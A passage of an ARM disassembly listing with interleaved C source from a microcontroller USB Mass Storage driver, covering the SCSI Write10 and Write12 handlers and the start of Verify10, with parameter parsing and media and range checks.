 800a73e:	4603      	mov	r3, r0
}
 800a740:	4618      	mov	r0, r3
 800a742:	3718      	adds	r7, #24
 800a744:	46bd      	mov	sp, r7
 800a746:	bd80      	pop	{r7, pc}

0800a748 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a748:	b580      	push	{r7, lr}
 800a74a:	b086      	sub	sp, #24
 800a74c:	af00      	add	r7, sp, #0
 800a74e:	60f8      	str	r0, [r7, #12]
 800a750:	460b      	mov	r3, r1
 800a752:	607a      	str	r2, [r7, #4]
 800a754:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a756:	68fb      	ldr	r3, [r7, #12]
 800a758:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a75c:	68fb      	ldr	r3, [r7, #12]
 800a75e:	32b0      	adds	r2, #176	; 0xb0
 800a760:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a764:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a766:	697b      	ldr	r3, [r7, #20]
 800a768:	2b00      	cmp	r3, #0
 800a76a:	d102      	bne.n	800a772 <SCSI_Write10+0x2a>
  {
    return -1;
 800a76c:	f04f 33ff 	mov.w	r3, #4294967295
 800a770:	e0c7      	b.n	800a902 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a772:	697b      	ldr	r3, [r7, #20]
 800a774:	7a1b      	ldrb	r3, [r3, #8]
 800a776:	2b00      	cmp	r3, #0
 800a778:	f040 80bd 	bne.w	800a8f6 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a77c:	697b      	ldr	r3, [r7, #20]
 800a77e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a782:	699b      	ldr	r3, [r3, #24]
 800a784:	2b00      	cmp	r3, #0
 800a786:	d10b      	bne.n	800a7a0 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a788:	697b      	ldr	r3, [r7, #20]
 800a78a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a78e:	7f59      	ldrb	r1, [r3, #29]
 800a790:	2320      	movs	r3, #32
 800a792:	2205      	movs	r2, #5
 800a794:	68f8      	ldr	r0, [r7, #12]
 800a796:	f7ff fd75 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a79a:	f04f 33ff 	mov.w	r3, #4294967295
 800a79e:	e0b0      	b.n	800a902 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a7a0:	697b      	ldr	r3, [r7, #20]
 800a7a2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7a6:	7f1b      	ldrb	r3, [r3, #28]
 800a7a8:	b25b      	sxtb	r3, r3
 800a7aa:	2b00      	cmp	r3, #0
 800a7ac:	da0b      	bge.n	800a7c6 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a7ae:	697b      	ldr	r3, [r7, #20]
 800a7b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7b4:	7f59      	ldrb	r1, [r3, #29]
 800a7b6:	2320      	movs	r3, #32
 800a7b8:	2205      	movs	r2, #5
 800a7ba:	68f8      	ldr	r0, [r7, #12]
 800a7bc:	f7ff fd62 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a7c0:	f04f 33ff 	mov.w	r3, #4294967295
 800a7c4:	e09d      	b.n	800a902 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a7c6:	68fb      	ldr	r3, [r7, #12]
 800a7c8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a7cc:	68fa      	ldr	r2, [r7, #12]
 800a7ce:	33b0      	adds	r3, #176	; 0xb0
 800a7d0:	009b      	lsls	r3, r3, #2
 800a7d2:	4413      	add	r3, r2
 800a7d4:	685b      	ldr	r3, [r3, #4]
 800a7d6:	689b      	ldr	r3, [r3, #8]
 800a7d8:	7afa      	ldrb	r2, [r7, #11]
 800a7da:	4610      	mov	r0, r2
 800a7dc:	4798      	blx	r3
 800a7de:	4603      	mov	r3, r0
 800a7e0:	2b00      	cmp	r3, #0
 800a7e2:	d008      	beq.n	800a7f6 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a7e4:	7af9      	ldrb	r1, [r7, #11]
 800a7e6:	233a      	movs	r3, #58	; 0x3a
 800a7e8:	2202      	movs	r2, #2
 800a7ea:	68f8      	ldr	r0, [r7, #12]
 800a7ec:	f7ff fd4a 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a7f0:	f04f 33ff 	mov.w	r3, #4294967295
 800a7f4:	e085      	b.n	800a902 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a7f6:	68fb      	ldr	r3, [r7, #12]
 800a7f8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a7fc:	68fa      	ldr	r2, [r7, #12]
 800a7fe:	33b0      	adds	r3, #176	; 0xb0
 800a800:	009b      	lsls	r3, r3, #2
 800a802:	4413      	add	r3, r2
 800a804:	685b      	ldr	r3, [r3, #4]
 800a806:	68db      	ldr	r3, [r3, #12]
 800a808:	7afa      	ldrb	r2, [r7, #11]
 800a80a:	4610      	mov	r0, r2
 800a80c:	4798      	blx	r3
 800a80e:	4603      	mov	r3, r0
 800a810:	2b00      	cmp	r3, #0
 800a812:	d008      	beq.n	800a826 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a814:	7af9      	ldrb	r1, [r7, #11]
 800a816:	2327      	movs	r3, #39	; 0x27
 800a818:	2202      	movs	r2, #2
 800a81a:	68f8      	ldr	r0, [r7, #12]
 800a81c:	f7ff fd32 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a820:	f04f 33ff 	mov.w	r3, #4294967295
 800a824:	e06d      	b.n	800a902 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a826:	687b      	ldr	r3, [r7, #4]
 800a828:	3302      	adds	r3, #2
 800a82a:	781b      	ldrb	r3, [r3, #0]
 800a82c:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a82e:	687b      	ldr	r3, [r7, #4]
 800a830:	3303      	adds	r3, #3
 800a832:	781b      	ldrb	r3, [r3, #0]
 800a834:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a836:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a838:	687b      	ldr	r3, [r7, #4]
 800a83a:	3304      	adds	r3, #4
 800a83c:	781b      	ldrb	r3, [r3, #0]
 800a83e:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a840:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a842:	687a      	ldr	r2, [r7, #4]
 800a844:	3205      	adds	r2, #5
 800a846:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a848:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a84a:	697a      	ldr	r2, [r7, #20]
 800a84c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a850:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a852:	687b      	ldr	r3, [r7, #4]
 800a854:	3307      	adds	r3, #7
 800a856:	781b      	ldrb	r3, [r3, #0]
 800a858:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a85a:	687a      	ldr	r2, [r7, #4]
 800a85c:	3208      	adds	r2, #8
 800a85e:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a860:	4313      	orrs	r3, r2
 800a862:	697a      	ldr	r2, [r7, #20]
 800a864:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a868:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a86a:	697b      	ldr	r3, [r7, #20]
 800a86c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a870:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a872:	697b      	ldr	r3, [r7, #20]
 800a874:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a878:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a87a:	7af9      	ldrb	r1, [r7, #11]
 800a87c:	68f8      	ldr	r0, [r7, #12]
 800a87e:	f000 f97a 	bl	800ab76 <SCSI_CheckAddressRange>
 800a882:	4603      	mov	r3, r0
 800a884:	2b00      	cmp	r3, #0
 800a886:	da02      	bge.n	800a88e <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a888:	f04f 33ff 	mov.w	r3, #4294967295
 800a88c:	e039      	b.n	800a902 <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a88e:	697b      	ldr	r3, [r7, #20]
 800a890:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a894:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a896:	697a      	ldr	r2, [r7, #20]
 800a898:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a89c:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a8a0:	fb02 f303 	mul.w	r3, r2, r3
 800a8a4:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a8a6:	697b      	ldr	r3, [r7, #20]
 800a8a8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8ac:	699b      	ldr	r3, [r3, #24]
 800a8ae:	693a      	ldr	r2, [r7, #16]
 800a8b0:	429a      	cmp	r2, r3
 800a8b2:	d00b      	beq.n	800a8cc <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8b4:	697b      	ldr	r3, [r7, #20]
 800a8b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8ba:	7f59      	ldrb	r1, [r3, #29]
 800a8bc:	2320      	movs	r3, #32
 800a8be:	2205      	movs	r2, #5
 800a8c0:	68f8      	ldr	r0, [r7, #12]
 800a8c2:	f7ff fcdf 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a8c6:	f04f 33ff 	mov.w	r3, #4294967295
 800a8ca:	e01a      	b.n	800a902 <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a8cc:	693b      	ldr	r3, [r7, #16]
 800a8ce:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a8d2:	bf28      	it	cs
 800a8d4:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a8d8:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a8da:	697b      	ldr	r3, [r7, #20]
 800a8dc:	2201      	movs	r2, #1
 800a8de:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a8e0:	4b0a      	ldr	r3, [pc, #40]	; (800a90c <SCSI_Write10+0x1c4>)
 800a8e2:	7819      	ldrb	r1, [r3, #0]
 800a8e4:	697b      	ldr	r3, [r7, #20]
 800a8e6:	f103 0210 	add.w	r2, r3, #16
 800a8ea:	693b      	ldr	r3, [r7, #16]
 800a8ec:	68f8      	ldr	r0, [r7, #12]
 800a8ee:	f002 faf3 	bl	800ced8 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a8f2:	2300      	movs	r3, #0
 800a8f4:	e005      	b.n	800a902 <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a8f6:	7afb      	ldrb	r3, [r7, #11]
 800a8f8:	4619      	mov	r1, r3
 800a8fa:	68f8      	ldr	r0, [r7, #12]
 800a8fc:	f000 f9fe 	bl	800acfc <SCSI_ProcessWrite>
 800a900:	4603      	mov	r3, r0
}
 800a902:	4618      	mov	r0, r3
 800a904:	3718      	adds	r7, #24
 800a906:	46bd      	mov	sp, r7
 800a908:	bd80      	pop	{r7, pc}
 800a90a:	bf00      	nop
 800a90c:	2000010b 	.word	0x2000010b

0800a910 <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a910:	b580      	push	{r7, lr}
 800a912:	b086      	sub	sp, #24
 800a914:	af00      	add	r7, sp, #0
 800a916:	60f8      	str	r0, [r7, #12]
 800a918:	460b      	mov	r3, r1
 800a91a:	607a      	str	r2, [r7, #4]
 800a91c:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a91e:	68fb      	ldr	r3, [r7, #12]
 800a920:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a924:	68fb      	ldr	r3, [r7, #12]
 800a926:	32b0      	adds	r2, #176	; 0xb0
 800a928:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a92c:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a92e:	697b      	ldr	r3, [r7, #20]
 800a930:	2b00      	cmp	r3, #0
 800a932:	d102      	bne.n	800a93a <SCSI_Write12+0x2a>
  {
    return -1;
 800a934:	f04f 33ff 	mov.w	r3, #4294967295
 800a938:	e0d7      	b.n	800aaea <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a93a:	697b      	ldr	r3, [r7, #20]
 800a93c:	7a1b      	ldrb	r3, [r3, #8]
 800a93e:	2b00      	cmp	r3, #0
 800a940:	f040 80cd 	bne.w	800aade <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a944:	697b      	ldr	r3, [r7, #20]
 800a946:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a94a:	699b      	ldr	r3, [r3, #24]
 800a94c:	2b00      	cmp	r3, #0
 800a94e:	d10b      	bne.n	800a968 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a950:	697b      	ldr	r3, [r7, #20]
 800a952:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a956:	7f59      	ldrb	r1, [r3, #29]
 800a958:	2320      	movs	r3, #32
 800a95a:	2205      	movs	r2, #5
 800a95c:	68f8      	ldr	r0, [r7, #12]
 800a95e:	f7ff fc91 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a962:	f04f 33ff 	mov.w	r3, #4294967295
 800a966:	e0c0      	b.n	800aaea <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a968:	697b      	ldr	r3, [r7, #20]
 800a96a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a96e:	7f1b      	ldrb	r3, [r3, #28]
 800a970:	b25b      	sxtb	r3, r3
 800a972:	2b00      	cmp	r3, #0
 800a974:	da0b      	bge.n	800a98e <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a976:	697b      	ldr	r3, [r7, #20]
 800a978:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a97c:	7f59      	ldrb	r1, [r3, #29]
 800a97e:	2320      	movs	r3, #32
 800a980:	2205      	movs	r2, #5
 800a982:	68f8      	ldr	r0, [r7, #12]
 800a984:	f7ff fc7e 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800a988:	f04f 33ff 	mov.w	r3, #4294967295
 800a98c:	e0ad      	b.n	800aaea <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a98e:	68fb      	ldr	r3, [r7, #12]
 800a990:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a994:	68fa      	ldr	r2, [r7, #12]
 800a996:	33b0      	adds	r3, #176	; 0xb0
 800a998:	009b      	lsls	r3, r3, #2
 800a99a:	4413      	add	r3, r2
 800a99c:	685b      	ldr	r3, [r3, #4]
 800a99e:	689b      	ldr	r3, [r3, #8]
 800a9a0:	7afa      	ldrb	r2, [r7, #11]
 800a9a2:	4610      	mov	r0, r2
 800a9a4:	4798      	blx	r3
 800a9a6:	4603      	mov	r3, r0
 800a9a8:	2b00      	cmp	r3, #0
 800a9aa:	d00b      	beq.n	800a9c4 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a9ac:	7af9      	ldrb	r1, [r7, #11]
 800a9ae:	233a      	movs	r3, #58	; 0x3a
 800a9b0:	2202      	movs	r2, #2
 800a9b2:	68f8      	ldr	r0, [r7, #12]
 800a9b4:	f7ff fc66 	bl	800a284 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a9b8:	697b      	ldr	r3, [r7, #20]
 800a9ba:	2205      	movs	r2, #5
 800a9bc:	721a      	strb	r2, [r3, #8]
      return -1;
 800a9be:	f04f 33ff 	mov.w	r3, #4294967295
 800a9c2:	e092      	b.n	800aaea <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a9c4:	68fb      	ldr	r3, [r7, #12]
 800a9c6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a9ca:	68fa      	ldr	r2, [r7, #12]
 800a9cc:	33b0      	adds	r3, #176	; 0xb0
 800a9ce:	009b      	lsls	r3, r3, #2
 800a9d0:	4413      	add	r3, r2
 800a9d2:	685b      	ldr	r3, [r3, #4]
 800a9d4:	68db      	ldr	r3, [r3, #12]
 800a9d6:	7afa      	ldrb	r2, [r7, #11]
 800a9d8:	4610      	mov	r0, r2
 800a9da:	4798      	blx	r3
 800a9dc:	4603      	mov	r3, r0
 800a9de:	2b00      	cmp	r3, #0
 800a9e0:	d00b      	beq.n	800a9fa <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a9e2:	7af9      	ldrb	r1, [r7, #11]
 800a9e4:	2327      	movs	r3, #39	; 0x27
 800a9e6:	2202      	movs	r2, #2
 800a9e8:	68f8      	ldr	r0, [r7, #12]
 800a9ea:	f7ff fc4b 	bl	800a284 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a9ee:	697b      	ldr	r3, [r7, #20]
 800a9f0:	2205      	movs	r2, #5
 800a9f2:	721a      	strb	r2, [r3, #8]
      return -1;
 800a9f4:	f04f 33ff 	mov.w	r3, #4294967295
 800a9f8:	e077      	b.n	800aaea <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9fa:	687b      	ldr	r3, [r7, #4]
 800a9fc:	3302      	adds	r3, #2
 800a9fe:	781b      	ldrb	r3, [r3, #0]
 800aa00:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800aa02:	687b      	ldr	r3, [r7, #4]
 800aa04:	3303      	adds	r3, #3
 800aa06:	781b      	ldrb	r3, [r3, #0]
 800aa08:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa0a:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800aa0c:	687b      	ldr	r3, [r7, #4]
 800aa0e:	3304      	adds	r3, #4
 800aa10:	781b      	ldrb	r3, [r3, #0]
 800aa12:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800aa14:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800aa16:	687a      	ldr	r2, [r7, #4]
 800aa18:	3205      	adds	r2, #5
 800aa1a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800aa1c:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa1e:	697a      	ldr	r2, [r7, #20]
 800aa20:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa24:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800aa26:	687b      	ldr	r3, [r7, #4]
 800aa28:	3306      	adds	r3, #6
 800aa2a:	781b      	ldrb	r3, [r3, #0]
 800aa2c:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800aa2e:	687b      	ldr	r3, [r7, #4]
 800aa30:	3307      	adds	r3, #7
 800aa32:	781b      	ldrb	r3, [r3, #0]
 800aa34:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800aa36:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800aa38:	687b      	ldr	r3, [r7, #4]
 800aa3a:	3308      	adds	r3, #8
 800aa3c:	781b      	ldrb	r3, [r3, #0]
 800aa3e:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800aa40:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800aa42:	687a      	ldr	r2, [r7, #4]
 800aa44:	3209      	adds	r2, #9
 800aa46:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800aa48:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800aa4a:	697a      	ldr	r2, [r7, #20]
 800aa4c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa50:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800aa52:	697b      	ldr	r3, [r7, #20]
 800aa54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa58:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aa5a:	697b      	ldr	r3, [r7, #20]
 800aa5c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa60:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa62:	7af9      	ldrb	r1, [r7, #11]
 800aa64:	68f8      	ldr	r0, [r7, #12]
 800aa66:	f000 f886 	bl	800ab76 <SCSI_CheckAddressRange>
 800aa6a:	4603      	mov	r3, r0
 800aa6c:	2b00      	cmp	r3, #0
 800aa6e:	da02      	bge.n	800aa76 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aa70:	f04f 33ff 	mov.w	r3, #4294967295
 800aa74:	e039      	b.n	800aaea <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aa76:	697b      	ldr	r3, [r7, #20]
 800aa78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa7c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa7e:	697a      	ldr	r2, [r7, #20]
 800aa80:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa84:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa88:	fb02 f303 	mul.w	r3, r2, r3
 800aa8c:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa8e:	697b      	ldr	r3, [r7, #20]
 800aa90:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa94:	699b      	ldr	r3, [r3, #24]
 800aa96:	693a      	ldr	r2, [r7, #16]
 800aa98:	429a      	cmp	r2, r3
 800aa9a:	d00b      	beq.n	800aab4 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa9c:	697b      	ldr	r3, [r7, #20]
 800aa9e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aaa2:	7f59      	ldrb	r1, [r3, #29]
 800aaa4:	2320      	movs	r3, #32
 800aaa6:	2205      	movs	r2, #5
 800aaa8:	68f8      	ldr	r0, [r7, #12]
 800aaaa:	f7ff fbeb 	bl	800a284 <SCSI_SenseCode>
      return -1;
 800aaae:	f04f 33ff 	mov.w	r3, #4294967295
 800aab2:	e01a      	b.n	800aaea <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aab4:	693b      	ldr	r3, [r7, #16]
 800aab6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aaba:	bf28      	it	cs
 800aabc:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aac0:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aac2:	697b      	ldr	r3, [r7, #20]
 800aac4:	2201      	movs	r2, #1
 800aac6:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aac8:	4b0a      	ldr	r3, [pc, #40]	; (800aaf4 <SCSI_Write12+0x1e4>)
 800aaca:	7819      	ldrb	r1, [r3, #0]
 800aacc:	697b      	ldr	r3, [r7, #20]
 800aace:	f103 0210 	add.w	r2, r3, #16
 800aad2:	693b      	ldr	r3, [r7, #16]
 800aad4:	68f8      	ldr	r0, [r7, #12]
 800aad6:	f002 f9ff 	bl	800ced8 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aada:	2300      	movs	r3, #0
 800aadc:	e005      	b.n	800aaea <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800aade:	7afb      	ldrb	r3, [r7, #11]
 800aae0:	4619      	mov	r1, r3
 800aae2:	68f8      	ldr	r0, [r7, #12]
 800aae4:	f000 f90a 	bl	800acfc <SCSI_ProcessWrite>
 800aae8:	4603      	mov	r3, r0
}
 800aaea:	4618      	mov	r0, r3
 800aaec:	3718      	adds	r7, #24
 800aaee:	46bd      	mov	sp, r7
 800aaf0:	bd80      	pop	{r7, pc}
 800aaf2:	bf00      	nop
 800aaf4:	2000010b 	.word	0x2000010b

0800aaf8 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aaf8:	b580      	push	{r7, lr}
 800aafa:	b086      	sub	sp, #24
 800aafc:	af00      	add	r7, sp, #0
 800aafe:	60f8      	str	r0, [r7, #12]
 800ab00:	460b      	mov	r3, r1
 800ab02:	607a      	str	r2, [r7, #4]
 800ab04:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab06:	68fb      	ldr	r3, [r7, #12]
 800ab08:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab0c:	68fb      	ldr	r3, [r7, #12]
 800ab0e:	32b0      	adds	r2, #176	; 0xb0
 800ab10:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab14:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab16:	697b      	ldr	r3, [r7, #20]
 800ab18:	2b00      	cmp	r3, #0
 800ab1a:	d102      	bne.n	800ab22 <SCSI_Verify10+0x2a>
  {
    return -1;
 800ab1c:	f04f 33ff 	mov.w	r3, #4294967295
 800ab20:	e025      	b.n	800ab6e <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800ab22:	687b      	ldr	r3, [r7, #4]
 800ab24:	3301      	adds	r3, #1
